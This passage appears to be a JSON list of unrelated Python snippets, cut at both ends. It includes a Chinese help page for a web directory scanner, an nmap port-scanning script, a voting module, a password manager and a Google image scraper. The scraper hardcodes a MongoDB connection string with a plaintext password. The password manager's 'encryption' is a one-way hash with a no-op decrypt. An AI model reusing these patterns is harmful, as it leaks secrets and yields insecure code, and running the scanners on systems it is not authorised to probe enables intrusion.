\u6307\u5b9a\u76ee\u6807URL\uff0c\u53ef\u4ee5\u4f7f\u7528\u591a\u6b21\u6765\u6307\u5b9a\u591a\u4e2a\u76ee\u6807\r\n        -l \u6216 --urls-file: \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6URL\u5217\u8868\r\n        --stdin: \u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6URL\u5217\u8868\r\n        --cidr: \u4f7f\u7528CIDR\u8868\u793a\u6cd5\u6307\u5b9a\u76ee\u6807\r\n        --raw: \u4ece\u6587\u4ef6\u52a0\u8f7d\u539f\u59cbHTTP\u8bf7\u6c42\r\n        -s \u6216 --session: \u6307\u5b9a\u4f1a\u8bdd\u6587\u4ef6\r\n        --config: \u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\u8def\u5f84\r\n\r\n        \u5b57\u5178\u8bbe\u7f6e:\r\n        -w \u6216 --wordlists: \u6307\u5b9a\u5355\u8bcd\u5217\u8868\u6587\u4ef6\u6216\u76ee\u5f55\r\n        -e \u6216 --extensions: \u6307\u5b9a\u7528\u9017\u53f7\u5206\u9694\u7684\u6269\u5c55\u540d\u5217\u8868\r\n        -f \u6216 --force-extensions: \u5f3a\u5236\u4e3a\u5355\u8bcd\u5217\u8868\u6761\u76ee\u6dfb\u52a0\u6269\u5c55\u540d\r\n        -O \u6216 --overwrite-extensions: \u4f7f\u7528\u6307\u5b9a\u6269\u5c55\u540d\u8986\u76d6\u5355\u8bcd\u5217\u8868\u4e2d\u7684\u5176\u4ed6\u6269\u5c55\u540d\r\n        --exclude-extensions: \u6307\u5b9a\u8981\u6392\u9664\u7684\u6269\u5c55\u540d\u5217\u8868\r\n        --remove-extensions: \u4ece\u8def\u5f84\u4e2d\u79fb\u9664\u6240\u6709\u6269\u5c55\u540d\r\n        --prefixes: \u4e3a\u5355\u8bcd\u5217\u8868\u6761\u76ee\u6dfb\u52a0\u524d\u7f00\r\n        --suffixes: \u4e3a\u5355\u8bcd\u5217\u8868\u6761\u76ee\u6dfb\u52a0\u540e\u7f00\r\n        -U \u6216 --uppercase: \u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u7684\u5355\u8bcd\u5217\u8868\r\n        -L \u6216 --lowercase: \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\u7684\u5355\u8bcd\u5217\u8868\r\n        -C \u6216 --capital: \u5355\u8bcd\u5217\u8868\u4e2d\u7684\u5355\u8bcd\u9996\u5b57\u6bcd\u5927\u5199\r\n\r\n        \u901a\u7528\u8bbe\u7f6e:\r\n        -t \u6216 --threads: \u8bbe\u7f6e\u7ebf\u7a0b\u6570\r\n        -r \u6216 --recursive: \u9012\u5f52\u626b\u63cf\r\n        --deep-recursive: \u5bf9\u6bcf\u4e2a\u5b50\u76ee\u5f55\u6267\u884c\u6df1\u5ea6\u9012\u5f52\u626b\u63cf\r\n        --force-recursive: \u5bf9\u53d1\u73b0\u7684\u6bcf\u4e2a\u8def\u5f84\u6267\u884c\u9012\u5f52\u626b\u63cf\r\n        -R \u6216 --max-recursion-depth: \u8bbe\u7f6e\u6700\u5927\u9012\u5f52\u6df1\u5ea6\r\n        --recursion-status: \u8bbe\u7f6e\u6709\u6548\u7684\u9012\u5f52\u626b\u63cf\u72b6\u6001\u7801\r\n        --subdirs: \u6307\u5b9a\u8981\u626b\u63cf\u7684\u5b50\u76ee\u5f55\r\n        --exclude-subdirs: \u6307\u5b9a\u9012\u5f52\u626b\u63cf\u65f6\u8981\u6392\u9664\u7684\u5b50\u76ee\u5f55\r\n        -i \u6216 --include-status: \u5305\u542b\u7279\u5b9a\u7684HTTP\u72b6\u6001\u7801\r\n        -x \u6216 --exclude-status: \u6392\u9664\u7279\u5b9a\u7684HTTP\u72b6\u6001\u7801\r\n        --exclude-sizes: \u6839\u636e\u54cd\u5e94\u5927\u5c0f\u6392\u9664\r\n        --exclude-text: \u6839\u636e\u54cd\u5e94\u6587\u672c\u6392\u9664\r\n        --exclude-regex: \u6839\u636e\u6b63\u5219\u8868\u8fbe\u5f0f\u6392\u9664\u54cd\u5e94\r\n        --exclude-redirect: \u6392\u9664\u5339\u914d\u7279\u5b9a\u6587\u672c\u6216\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u91cd\u5b9a\u5411\r\n        --exclude-response: \u6392\u9664\u4e0e\u7279\u5b9a\u9875\u9762\u76f8\u4f3c\u7684\u54cd\u5e94\r\n        --skip-on-status: \u9047\u5230\u6307\u5b9a\u72b6\u6001\u7801\u65f6\u8df3\u8fc7\u76ee\u6807\r\n        --min-response-size: \u8bbe\u7f6e\u54cd\u5e94\u7684\u6700\u5c0f\u957f\u5ea6\r\n        --max-response-size: \u8bbe\u7f6e\u54cd\u5e94\u7684\u6700\u5927\u957f\u5ea6\r\n        --max-time: \u8bbe\u7f6e\u626b\u63cf\u7684\u6700\u5927\u8fd0\u884c\u65f6\u95f4\r\n        --exit-on-error: \u51fa\u9519\u65f6\u9000\u51fa\u626b\u63cf\r\n\r\n        \u8bf7\u6c42\u8bbe\u7f6e:\r\n        -m METHOD, --http-method=METHOD: \u8bbe\u7f6eHTTP\u65b9\u6cd5\uff08\u9ed8\u8ba4\u4e3aGET\uff09\r\n        -d DATA, --data=DATA: \u8bbe\u7f6eHTTP POST\u8bf7\u6c42\u7684\u6570\u636e\r\n        --data-file=PATH: \u6307\u5b9a\u5305\u542bHTTP POST\u8bf7\u6c42\u6570\u636e\u7684\u6587\u4ef6\u8def\u5f84\r\n        -H HEADERS, --header=HEADERS: \u8bbe\u7f6eHTTP\u8bf7",
    "import json\nfrom pymongo import MongoClient\nfrom urllib.parse import quote_plus\nfrom dotenv import load_dotenv\nimport os\n\n# Load environment variables from .env file\nload_dotenv()\nMONGODB_USERNAME = os.getenv(\"MONGODB_USERNAME\")\nMONGODB_PASSWORD = os.getenv(\"MONGODB_PASSWORD\")\nMONGODB_DB_NAME = os.getenv(\"MONGODB_DB_NAME\")\n\n\ndef connect_2_db():\n    # connect to mongo\n    password = quote_plus(MONGODB_PASSWORD)\n    url = f\"mongodb+srv://{MONGODB_USERNAME}:{password}@cluster0.hm3ugvt.mongodb.net/{MONGODB_DB_NAME}?retryWrites=true&w=majority\"\n\n    client = MongoClient(url)\n    db = client[MONGODB_DB_NAME]\n    api_keys = db[\"api_keys\"]\n    feedbacks = db[\"feedbacks\"]\n    newsletter_users = db[\"newsletter_users\"]\n\n    return api_keys, feedbacks, newsletter_users\n\n\ndef find_api_key(api_key):\n    api_keys, _, _ = connect_2_db()\n    find_api_key = api_keys.find_one({\"api_key\": api_key})\n    return find_api_key\n\ndef save_feedback_to_db(feedback):\n    _, feedbacks, _ = connect_2_db()\n    feedbacks.insert_one({\"feedback\": feedback})\n\ndef find_newsletter_user(email):\n    _, _, newsletter_users = connect_2_db()\n    find_user = newsletter_users.find_one({\"email\": email})\n    return find_user\n\ndef save_newsletter_user_to_db(email):\n    _, _, newsletter_users = connect_2_db()\n    newsletter_users.insert_one({\"email\": email})\n\n\n\n\n# if __name__ == '__main__':\n#   _,_ = connect_2_db()\n",
    "class Employee:\n\n    def __init__(self, name, age, salary):\n        self.name = name\n        self.age = age\n        self.salary = salary\n\n    def print_employee(self):\n        return f\"{self.name} has age {self.age} and salary {self.salary}\"\n\n    def update_salary(self, new_salary):\n        self.salary = new_salary\n\n\nclass EmployeeManager:\n\n    def __init__(self):\n        self.employees = list()\n\n    def handle(self, choice):\n        if choice == 1:\n            self.add()\n        elif choice == 2:\n            self.print_all_employees()\n        elif choice == 3:\n            self.delete_by_age_range()\n        elif choice == 4:\n            x = self.update_salary_by()\n            if not x:\n                print(\"Error there is no such an Employee\")\n        else:\n            exit(0)\n\n    def add(self):\n        emp = Employee(\"x\", 2, 3)\n        emp.name = input(\"Enter Employee name: \")\n        emp.age = int(input(\"Enter Employee age: \"))\n        emp.salary = int(input(\"Enter Employee salary:\"))\n        self.employees.append(emp)\n\n    def print_all_employees(self):\n        for emp in self.employees:\n            print(\"Employee: \", emp.print_employee())\n\n    def delete_by_age_range(self):\n        a, b = input(\"Enter range of ages to delete: \").split()\n        a = int(a)\n        b = int(b)\n        if a > b:\n            a, b = b, a\n        for idx in range(len(self.employees) - 1, -1, -1):\n            emp = self.employees[idx]\n            if a <= emp.age <= b:\n                print('\\tDeleting', emp.name)\n                self.employees.pop(idx)\n\n\n    def update_salary_by(self):\n        name = input(\"Enter Employee name: \")\n        new_salary = int(input(\"Enter new salary: \"))\n        done = False\n        for emp in self.employees:\n            if emp.name == name:\n                emp.update_salary(new_salary)\n                done = True\n        if done:\n            return True\n        return False\n\n\nclass FrontedManager:\n    def __init__(self):\n        self.manager = EmployeeManager()\n\n    def print_menu(self):\n        print(\"1) add new employee\")\n        print(\"2) print all employees\")\n        print(\"3) delete by age range\")\n        print(\"4) update Salary by name\")\n        print(\"5) End the program\")\n        choice = input()\n        for i in choice:\n            if not i.isdigit():\n                print(\"invalid input Try again!\")\n                self.print_menu()\n        if len(choice) != 1:\n            print(\"invalid input Try again!\")\n            self.print_menu()\n        choice = int(choice)\n        if not 1 <= choice <= 5:\n            print(\"invalid input Try again!\")\n            self.print_menu()\n        self.manager.handle(choice)\n        self.print_menu()\n\n\nfront_manager = FrontedManager()  # Create an instance of FrontedManager\nfront_manager.print_menu()  # Call the print_menu method on the instance\n",
    "def encrypt_database(load, Fernet, remove, DE_PASSWORD_PATH:str, EN_PASSWORD_PATH:str, key:str=None ) -> None: # Encrypt the database.. \n    data:str = None \n    try : \n        with open(file= DE_PASSWORD_PATH, mode='r', encoding='utf-8') as file :\n            data = file.read()\n    except :\n        # If the database is not found.. \n        raise Exception('Error: The database file is not found..!')\n\n    if not data : \n        # If the database is empty.. \n        raise Exception('Error: The database is empty..!')\n    # If there is no key.. \n    if not key : \n        key = Fernet.generate_key().decode() \n        print (f\"Your Encryption key is : \\033[0;32m{key}\\033[0m\")\n    print(\"\\033[0;91mPlease keep your key in a safe place.\")\n    print(\"Do Not share it with anyone.\")\n    print(\"If you lose your key, you will not be able to access the database..!\\033[0m\")\n    print (\"\\033[0;34mThe database has been encrypted successfully.\\033[0m\")\n    # Generate the cypher.. \n    cypher:Fernet = Fernet( key.encode() )\n    # Encrypt the data.. \n    enc_data: str = cypher.encrypt(data.encode()).decode()\n    # Save the data into the new file.. \n    with open(file= EN_PASSWORD_PATH, mode='w', encoding='utf-8') as file :\n        file.write(enc_data)\n    # remove the old file.. \n    remove( DE_PASSWORD_PATH )\n\ndef decrypt_database(load, Fernet, remove, EN_PASSWORD_PATH:str, DE_PASSWORD_PATH:str, key:str=None ) -> None : # Decrypt the database.. \n    data:str = None\n    try : \n        # read the encryption file.. \n        with open(file= EN_PASSWORD_PATH , mode='r', encoding='utf-8') as file :\n            data = file.read()\n    except : \n        # If there is no database.. \n        raise Exception('Error: There is no database is found..!')\n    # If there is no data in the databse.. \n    if not data: \n        raise Exception('Error: The database is empty..!')\n    # Generate the cypher.. \n    cypher:Fernet = Fernet( key.encode() )\n    # Decrypt the file.. \n    enc_data: str = cypher.decrypt(data.encode()).decode()\n    # Save the data into new file.. \n    with open(file= DE_PASSWORD_PATH , mode='w', encoding='utf-8') as file :\n        file.write(enc_data)\n    # remove the old file.. \n    remove( EN_PASSWORD_PATH )",
    "import turtle\n\n\nprint(\"______         _                                 _____                     _                \\n\");\nprint(\"| ___ \\       | |                               /  __ \\                   | |               \\n\");\nprint(\"| |_/ /  ___  | | _   _   __ _   ___   _ __     | /  \\/ _ __   ___   __ _ | |_   ___   _ __ \\n\");\nprint(\"|  __/  / _ \\ | || | | | / _` | / _ \\ | '_ \\    | |    | '__| / _ \\ / _` || __| / _ \\ | '__|\\n\");\nprint(\"| |    | (_) || || |_| || (_| || (_) || | | |   | \\__/\\| |   |  __/| (_| || |_ | (_) || |   \\n\");\nprint(\"\\_|     \\___/ |_| \\__, | \\__, | \\___/ |_| |_|    \\____/|_|    \\___| \\__,_| \\__| \\___/ |_|   \\n\");\nprint(\"                   __/ |  __/ |                                                             \\n\");\nprint(\"                  |___/  |___/                                                              \\n\");\n\n\nangles = int(input(\"Specify the number of angles:\"));\n\n\nturtle.reset();\n\n\nfor i in range(angles):\n    turtle.forward(100);\n    turtle.right(360/angles);",
    "import os\nimport sys\nimport json\n\nfrom elections import view\nfrom encrypt import encryption\n\n# Declaration section\ncurrent_dir = os.path.dirname(os.path.abspath(__file__))\none_level_up = os.path.abspath(os.path.join(current_dir, '../'))\n\nencryption_path = os.path.join(one_level_up, \"encrypt\")\nvoter_data_path = os.path.join(one_level_up, \"database\")\n\nsys.path.append(voter_data_path)\nsys.path.append(encryption_path)\n\n\ndef is_allowed_to_vote(user_email, chosen_election):\n    meta_data = view.read_meta_data(chosen_election)\n\n    voters = read_vote_data(chosen_election)\n\n    if user_email == meta_data[\"creator\"] and meta_data[\"self_voting\"] == \"false\":\n        print(\"You do not have permission participate in this election\")\n        print()\n        return False\n    \n    if user_email in meta_data[\"voters\"] or meta_data[\"voters\"] == [\"everyone\"]:\n        pass\n    else:\n        print(\"You do not have permission participate in this election!\")\n        print()\n        return False\n\n    if user_email in voters:\n        print(\"You have already voted in this election!\")\n        print()\n        return False\n    \n    return True\n\n\ndef read_vote_data(chosen_election):\n    voter_file = os.path.join(voter_data_path, chosen_election, 'voter_data.txt')\n\n    try:\n        with open(voter_file, \"rb\") as file:\n            new_file = file.readlines()\n\n    except Exception as e:\n        print(e)\n        exit(\"Exception found when trying to open voter data file\")\n    \n    voters = []\n    for voter_data in new_file:\n        voter = encryption.decrypt_email(voter_data)\n        voters.append(voter)\n    \n    return voters\n\n\ndef read_candidate_data(chosen_election):\n    meta_data = os.path.join(voter_data_path, chosen_election, \"option_data.json\")\n    with open(meta_data, 'r') as file:\n        data = json.load(file)\n    return data\n\n\ndef get_candidates(chosen_election):\n    candidate_data = read_candidate_data(chosen_election)\n\n    candidates = []\n    for option, additional_infromation in candidate_data.items():\n        candidates.append([option, additional_infromation])\n    \n    return candidates\n\n\ndef prompt_for_option(candidate_list):\n    # [[], []]\n    for index, option in enumerate(candidate_list):\n        print()\n        print(f\"{index+1}. {option[0]}\")\n        print(f\"Additional Information: {option[1]}.\")\n        print()\n    \n    while True:\n        chosen_option_number = input(\"Enter the option / candidate number you wish to vote for: \")\n        try:\n            chosen_option_number = int(chosen_option_number)\n            if chosen_option_number <= 0 or chosen_option_number > len(candidate_list):\n                continue\n            return chosen_option_number\n        except:\n            continue\n\n\ndef write_vote(chosen_election, email, option_chosen):\n    voter_file = os.path.join(voter_data_path, chosen_election, 'voter_data.txt')\n\n    encrypted_email = encryption.encrypt_email(email)\n    with open(voter_file, \"ab\") as file:\n        file.write(encrypted_email + b'\\n')\n\n\ndef get_secret_email(email):\n    return encryption.encrypt_email(email)\n\n\ndef update_vote_score(chosen_election, option ):\n    meta_data = view.read_meta_data(chosen_election)\n\n    meta_data[\"election_data\"][option] += 1\n\n    meta_data_path = os.path.join(voter_data_path, chosen_election, \"metadata.json\")\n    with open(meta_data_path, \"w\") as file:\n        json.dump(meta_data, file)\n\n",
    "from try_scan import *\r\nimport socket\r\ncl_sc()\r\n\r\ninterface = get_valid_interfaces()\r\ncount = 1\r\nfor face in interface:\r\n    print(str(count) + \" - \" + face)\r\n    count += 1\r\n\r\nuser = \"\"\r\nwhile not user.strip().isdigit() or int(user.strip()) > count:\r\n    user = input(\"Type interface you want to check: \")\r\n\r\nifaces = interface[int(user.strip()) - 1]\r\nip_address = get_ip(ifaces)\r\nget_mask_1 = get_mask(ifaces)\r\nscanner = nmap.PortScanner()\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n\r\n\r\nprint(\"nmap version \", scanner.nmap_version())\r\nprint( \"name is :\", face , \"------\",\"IP  scan :\" , ip_address)\r\nprint(\"subnet mask is : \",get_mask_1)\r\n\r\n\r\n\r\nuser_scanner = input(\"\"\"\r\n1 - TCP scanner\r\n2 - UDP scanner \r\n3 - More information \\n choose scan : \"\"\")\r\n\r\n\r\n\r\nscanner_result = scan_ip(ip_address)\r\nif user_scanner == \"1\":\r\n    scanner_result = nmap.PortScanner()\r\n    scanner_result.scan(ip_address, '1-340', '-sS')\r\n    print(scanner_result.scaninfo())\r\n    print(\"IP state:\", scanner_result[ip_address].state())\r\n    print(\"All protocols:\", scanner_result[ip_address].all_protocols())\r\n    print(\"Open TCP ports:\", scanner_result[ip_address]['tcp'].keys())\r\n\r\nelif user_scanner == '2':\r\n    scanner_result = nmap.PortScanner()\r\n    scanner_result.scan(ip_address, '1-800', '-sU')\r\n    print(scanner_result.scaninfo())\r\n    print(\"IP state:\", scanner_result[ip_address].state())\r\n    print(\"All protocols:\", scanner_result[ip_address].all_protocols())\r\n    print(\"Open UDP ports:\", scanner_result[ip_address]['udp'].keys())\r\n\r\nelif user_scanner == '3':\r\n    scanner_result = nmap.PortScanner()\r\n    scanner_result.scan(ip_address, '1-800', '-sS -sV -A -sC -O')\r\n    print(scanner_result.scaninfo())\r\n    print(\"IP state:\", scanner_result[ip_address].state())\r\n    print(\"All protocols:\", scanner_result[ip_address].all_protocols())\r\n    print(\"Open TCP ports:\", scanner_result[ip_address]['tcp'].keys())\r\n\r\nelse:\r\n    TypeError(\"enter valid number\")\r\n    ",
    "import tkinter as tk\nfrom tkinter import messagebox\nimport json\nimport hashlib\n\nclass PasswordManager:\n    def __init__(self):\n        self.passwords = {}\n        self.load_passwords()\n\n    def load_passwords(self):\n        try:\n            with open(\"passwords.json\", \"r\") as file:\n                encrypted_data = file.read()\n                decrypted_data = self.decrypt(encrypted_data)\n                self.passwords = json.loads(decrypted_data)\n        except FileNotFoundError:\n            pass\n        except json.JSONDecodeError:\n            pass\n\n    def save_passwords(self):\n        with open(\"passwords.json\", \"w\") as file:\n            encrypted_data = self.encrypt(json.dumps(self.passwords))\n            file.write(encrypted_data)\n\n    def encrypt(self, data):\n        # Simple encryption for demonstration purposes only\n        return hashlib.sha256(data.encode()).hexdigest()\n\n    def decrypt(self, data):\n        # Simple decryption for demonstration purposes only\n        return data\n\n    def add_password(self, website, username, password):\n        if website in self.passwords:\n            messagebox.showinfo(\"Info\", \"Website already exists. Updating password.\")\n        self.passwords[website] = {\"username\": username, \"password\": password}\n        self.save_passwords()\n        messagebox.showinfo(\"Info\", \"Password added/updated successfully for \" + website)\n\n    def get_password(self, website):\n        if website in self.passwords:\n            return self.passwords[website]\n        else:\n            messagebox.showerror(\"Error\", \"Website not found in password manager.\")\n\n    def delete_password(self, website):\n        if website in self.passwords:\n            del self.passwords[website]\n            self.save_passwords()\n            messagebox.showinfo(\"Info\", \"Password deleted successfully for \" + website)\n        else:\n            messagebox.showerror(\"Error\", \"Website not found in password manager.\")\n\n    def list_websites(self):\n        websites = \"\\n\".join(self.passwords.keys())\n        messagebox.showinfo(\"List of Websites\", \"List of Websites in Password Manager:\\n\" + websites)\n\n\nclass PasswordManagerGUI:\n    def __init__(self, master):\n        self.master = master\n        self.master.title(\"Password Manager\")\n\n        self.password_manager = PasswordManager()\n\n        self.website_label = tk.Label(master, text=\"Website:\")\n        self.website_label.grid(row=0, column=0, sticky=\"w\")\n        self.website_entry = tk.Entry(master)\n        self.website_entry.grid(row=0, column=1)\n\n        self.username_label = tk.Label(master, text=\"Username:\")\n        self.username_label.grid(row=1, column=0, sticky=\"w\")\n        self.username_entry = tk.Entry(master)\n        self.username_entry.grid(row=1, column=1)\n\n        self.password_label = tk.Label(master, text=\"Password:\")\n        self.password_label.grid(row=2, column=0, sticky=\"w\")\n        self.password_entry = tk.Entry(master, show=\"*\")\n        self.password_entry.grid(row=2, column=1)\n\n        self.add_button = tk.Button(master, text=\"Add/Update\", command=self.add_password)\n        self.add_button.grid(row=3, column=0, columnspan=2, pady=10)\n\n        self.get_button = tk.Button(master, text=\"Get\", command=self.get_password)\n        self.get_button.grid(row=4, column=0, columnspan=2, pady=5)\n\n        self.delete_button = tk.Button(master, text=\"Delete\", command=self.delete_password)\n        self.delete_button.grid(row=5, column=0, columnspan=2, pady=5)\n\n        self.list_button = tk.Button(master, text=\"List Websites\", command=self.list_websites)\n        self.list_button.grid(row=6, column=0, columnspan=2, pady=5)\n\n    def add_password(self):\n        website = self.website_entry.get()\n        username = self.username_entry.get()\n        password = self.password_entry.get()\n        self.password_manager.add_password(website, username, password)\n\n    def get_password(self):\n        website = self.website_entry.get()\n        password_info = self.password_manager.get_password(website)\n        if password_info:\n            messagebox.showinfo(\"Password Info\", f\"Username: {password_info['username']}\\nPassword: {password_info['password']}\")\n\n    def delete_password(self):\n        website = self.website_entry.get()\n        self.password_manager.delete_password(website)\n\n    def list_websites(self):\n        self.password_manager.list_websites()\n\n\ndef main():\n    root = tk.Tk()\n    app = PasswordManagerGUI(root)\n    root.mainloop()\n\nif __name__ == \"__main__\":\n    main()\n",
    "from pymongo.mongo_client import MongoClient\r\nfrom bs4 import BeautifulSoup\r\nimport requests\r\nimport os\r\n\r\nquery = 'Phones'\r\n\r\nurl = f\"https://www.google.com/search?q={query}&sxsrf=AJOqlzUuff1RXi2mm8I_OqOwT9VjfIDL7w:1676996143273&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiq-qK7gaf9AhXUgVYBHYReAfYQ_AUoA3oECAEQBQ&biw=1920&bih=937&dpr=1#imgrc=1th7VhSesfMJ4M\"\r\n\r\nresponse = requests.get(url)\r\n\r\nif response.status_code == 200:\r\n\r\n    save_directory = \"images/\"\r\n\r\n    # create the directory if it doesn't exist\r\n    if not os.path.exists(save_directory):\r\n        os.makedirs(save_directory)\r\n\r\n    soup = BeautifulSoup(response.text, 'html.parser')\r\n    images = soup.find_all('img')\r\n    del images[0]\r\n    img_data =[]\r\n    \r\n    for index,image_tag in enumerate(images):\r\n        # get the image source URL\r\n        image_url = image_tag['src']\r\n        #print(image_url)\r\n        \r\n        # send a request to the image URL and save the image\r\n        image_data = requests.get(image_url).content\r\n        mydict={\"Index\":index,\"Image\":image_data}\r\n        img_data.append(mydict)\r\n        # print((image_data))\r\n        with open(os.path.join(save_directory, f\"{query}_{index}.jpg\"), \"wb\") as f:\r\n            f.write(image_data)\r\n\r\n\r\nuri = \"mongodb+srv://mbansal1820:MongoDB7744@cluster0.jv3xc3i.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0\"\r\n\r\n# Create a new client and connect to the server\r\nclient = MongoClient(uri)\r\n\r\ndb = client['image_scrap']\r\ncollection = db['image_scrap_data']\r\n\r\ncollection.insert_many(img_data)",
    "country_balls_amount = 5\ntrack_data = [{'frame_id': 1, 'data': [{'cb_id': 0, 'bounding_box': [], 'x': 0, 'y': 520, 'track_id': None}, {'cb_id': 1, 'bounding_box': [856, 682, 963, 789], 'x': 913, 'y': 800, 'track_id': None}, {'cb_id': 2, 'bounding_box': [949, 20, 1052, 96], 'x': 1000, 'y': 110, 'track_id': None}, {'cb_id': 3, 'bounding_box': [-61, 285, 52, 400], 'x': 0, 'y': 387, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-79, -50, 71, 51], 'x': 0, 'y': 50, 'track_id': None}]}, {'frame_id': 2, 'data': [{'cb_id': 0, 'bounding_box': [-57, 442, 64, 571], 'x': 21, 'y': 555, 'track_id': None}, {'cb_id': 1, 'bounding_box': [842, 704, 986, 776], 'x': 916, 'y': 787, 'track_id': None}, {'cb_id': 2, 'bounding_box': [890, 141, 1048, 225], 'x': 969, 'y': 230, 'track_id': None}, {'cb_id': 3, 'bounding_box': [-46, 233, 98, 363], 'x': 28, 'y': 350, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-51, -36, 60, 42], 'x': 0, 'y': 48, 'track_id': None}]}, {'frame_id': 3, 'data': [{'cb_id': 0, 'bounding_box': [-13, 476, 82, 588], 'x': 42, 'y': 585, 'track_id': None}, {'cb_id': 1, 'bounding_box': [], 'x': 920, 'y': 773, 'track_id': None}, {'cb_id': 2, 'bounding_box': [872, 238, 1004, 326], 'x': 939, 'y': 318, 'track_id': None}, {'cb_id': 3, 'bounding_box': [7, 234, 118, 310], 'x': 57, 'y': 319, 'track_id': None}, {'cb_id': 4, 'bounding_box': [], 'x': 0, 'y': 47, 'track_id': None}]}, {'frame_id': 4, 'data': [{'cb_id': 0, 'bounding_box': [], 'x': 63, 'y': 610, 'track_id': None}, {'cb_id': 1, 'bounding_box': [880, 646, 994, 750], 'x': 924, 'y': 759, 'track_id': None}, {'cb_id': 2, 'bounding_box': [845, 290, 984, 396], 'x': 909, 'y': 379, 'track_id': None}, {'cb_id': 3, 'bounding_box': [14, 194, 155, 273], 'x': 85, 'y': 292, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-69, -54, 63, 26], 'x': 0, 'y': 45, 'track_id': None}]}, {'frame_id': 5, 'data': [{'cb_id': 0, 'bounding_box': [13, 540, 150, 614], 'x': 85, 'y': 630, 'track_id': None}, {'cb_id': 1, 'bounding_box': [854, 639, 1006, 753], 'x': 928, 'y': 745, 'track_id': None}, {'cb_id': 2, 'bounding_box': [822, 312, 926, 408], 'x': 878, 'y': 417, 'track_id': None}, {'cb_id': 3, 'bounding_box': [], 'x': 114, 'y': 270, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-72, -69, 47, 36], 'x': 1, 'y': 44, 'track_id': None}]}, {'frame_id': 6, 'data': [{'cb_id': 0, 'bounding_box': [61, 560, 155, 661], 'x': 106, 'y': 646, 'track_id': None}, {'cb_id': 1, 'bounding_box': [], 'x': 932, 'y': 730, 'track_id': None}, {'cb_id': 2, 'bounding_box': [785, 315, 922, 452], 'x': 848, 'y': 433, 'track_id': None}, {'cb_id': 3, 'bounding_box': [93, 146, 201, 255], 'x': 142, 'y': 252, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-73, -43, 61, 57], 'x': 1, 'y': 42, 'track_id': None}]}, {'frame_id': 7, 'data': [{'cb_id': 0, 'bounding_box': [85, 573, 207, 656], 'x': 127, 'y': 657, 'track_id': None}, {'cb_id': 1, 'bounding_box': [896, 599, 1016, 731], 'x': 936, 'y': 715, 'track_id': None}, {'cb_id': 2, 'bounding_box': [773, 320, 859, 420], 'x': 818, 'y': 432, 'track_id': None}, {'cb_id': 3, 'bounding_box': [114, 133, 240, 227], 'x': 171, 'y': 238, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-71, -71, 52, 40], 'x': 1, 'y': 41, 'track_id': None}]}, {'frame_id': 8, 'data': [{'cb_id': 0, 'bounding_box': [97, 564, 212, 657], 'x': 148, 'y': 665, 'track_id': None}, {'cb_id': 1, 'bounding_box': [875, 607, 993, 713], 'x': 940, 'y': 699, 'track_id': None}, {'cb_id': 2, 'bounding_box': [], 'x': 788, 'y': 418, 'track_id': None}, {'cb_id': 3, 'bounding_box': [139, 138, 265, 235], 'x': 200, 'y': 228, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-76, -76, 68, 21], 'x': 1, 'y': 40, 'track_id': None}]}, {'frame_id': 9, 'data': [{'cb_id': 0, 'bounding_box': [117, 589, 246, 680], 'x': 170, 'y': 669, 'track_id': None}, {'cb_id': 1, 'bounding_box': [878, 598, 1000, 664], 'x': 944, 'y': 682, 'track_id': None}, {'cb_id': 2, 'bounding_box': [708, 285, 831, 399], 'x': 757, 'y': 392, 'track_id': None}, {'cb_id': 3, 'bounding_box': [170, 102, 273, 210], 'x': 228, 'y': 221, 'track_id': None}, {'cb_id': 4, 'bounding_box': [], 'x': 2, 'y': 38, 'track_id': None}]}, {'frame_id': 10, 'data': [{'cb_id': 0, 'bounding_box': [133, 557, 237, 678], 'x': 191, 'y': 670, 'track_id': None}, {'cb_id': 1, 'bounding_box': [], 'x': 948, 'y': 665, 'track_id': None}, {'cb_id': 2, 'bounding_box': [677, 265, 788, 346], 'x': 727, 'y': 360, 'track_id': None}, {'cb_id': 3, 'bounding_box': [188, 124, 304, 228], 'x': 257, 'y': 217, 'track_id': None}, {'cb_id': 4, 'bounding_box': [], 'x': 2, 'y': 37, 'track_id': None}]}, {'frame_id': 11, 'data': [{'cb_id': 0, 'bounding_box': [160, 583, 270, 682], 'x': 212, 'y': 667, 'track_id': None}, {'cb_id': 1, 'bounding_box': [], 'x': 952, 'y': 648, 'track_id': None}, {'cb_id': 2, 'bounding_box': [634, 220, 742, 313], 'x': 697, 'y': 323, 'track_id': None}, {'cb_id': 3, 'bounding_box': [225, 133, 349, 233], 'x': 285, 'y': 216, 'track_id': None}, {'cb_id': 4, 'bounding_box': [-73, -61, 56, 46], 'x': 2, 'y': 36",
    "# -*-coding:utf-8-*-\n\nimport itertools\nimport os\nfrom \u5b9e\u65f6\u63a5\u53e3.Ashare import *\nfrom \u5de5\u5177.MyTT import *\nimport numpy as np\nimport baostock as bs\nimport pandas as pd\nimport time\nimport warnings\nimport feather\nimport itertools as it\nfrom scipy import stats\nimport math\nimport pandas as pd\nfrom tqdm import tqdm\n# <editor-fold desc=\"\u6846\u67b6\u5de5\u5177\u51fd\u6570\">\ndef \u5408\u6210k\u7ebf\u6c42high(a, barCount):\n    barCount = int(barCount)\n    data = pd.DataFrame()\n    data[\"a\"] = a\n    max = pd.Series(data['a'].rolling(barCount).max())\n    return max.values\ndef \u5408\u6210k\u7ebf\u6c42low(a, barCount):\n    barCount = int(barCount)\n    data = pd.DataFrame()\n    data[\"a\"] = a\n    min = pd.Series(data['a'].rolling(barCount).min())\n    return min.values\ndef \u5408\u6210k\u7ebf\u6c42\u5408\u6210\u91cf\u80fd(a, barCount):\n    barCount = int(barCount)\n    data = pd.DataFrame()\n    data[\"a\"] = a\n    sum = pd.Series(data['a'].rolling(barCount).sum())\n    return sum.values\n\n\ndef barslast(\u8f93\u5165):\n    \u8f93\u5165 = np.array(\u8f93\u5165)\n    \u8f93\u5165 = 